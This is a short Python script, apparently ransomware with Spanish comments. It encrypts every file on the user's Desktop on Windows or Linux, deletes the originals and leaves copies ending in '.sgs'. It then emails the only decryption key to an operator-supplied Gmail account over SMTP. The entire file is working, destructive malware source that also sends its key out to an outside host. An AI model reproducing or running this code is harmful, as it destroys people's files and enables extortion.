import os
from cryptography.fernet import Fernet
import subprocess
import smtplib
from email.mime.text import MIMEText




direccion_correo="" #completar variable para que funcione ---> correo@gmail.com
developer_key_gmail="" #completar variable para que funcione ---> XYZ-FGH-JKL-ÑZX




EncryptKey = Fernet.generate_key()
GeneralKey = Fernet(EncryptKey)

def send_email(subject, body, sender, recipients, password):
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
            smtp_server.login(sender, password)
            smtp_server.sendmail(sender, recipients, msg.as_string())

def WindowsEncrypt():
    path = os.path.join(os.path.expanduser("~"), "Desktop")
    for i,_,x in os.walk(path):
        for file in x:
            file_path = os.path.join(path,file)

            try:
                with open(file_path, 'rb') as fileOriginal:
                    dates = fileOriginal.read()

                encrypted = GeneralKey.encrypt(dates)


                with open(file_path + '.sgs','wb') as fileEncrypted:
                    fileEncrypted.write(encrypted)

                os.remove(file_path) 
            except:
                pass

    send_email(f"Encrypted_Key",EncryptKey.decode(),direccion_correo,[direccion_correo],developer_key_gmail)

def LinuxEncrypt():

    path = subprocess.check_output(["xdg-user-dir", "DESKTOP"]).decode().strip()
    
    for i, _, x in os.walk(path):
        for file in x:
            file_path = os.path.join(i,file)

            try:
                with open(file_path, 'rb') as fileOriginal:
                    dates = fileOriginal.read()

                encrypted = GeneralKey.encrypt(dates)


                with open(file_path + '.sgs','wb') as fileEncrypted:
                    fileEncrypted.write(encrypted)

                os.remove(file_path)  
            except:
                pass

    send_email(f"Encrypted_Key",EncryptKey.decode(),direccion_correo,[direccion_correo],developer_key_gmail)


if __name__ == "__main__":

    if(os.name=="nt"):
        WindowsEncrypt()
    else:
        LinuxEncrypt()
             






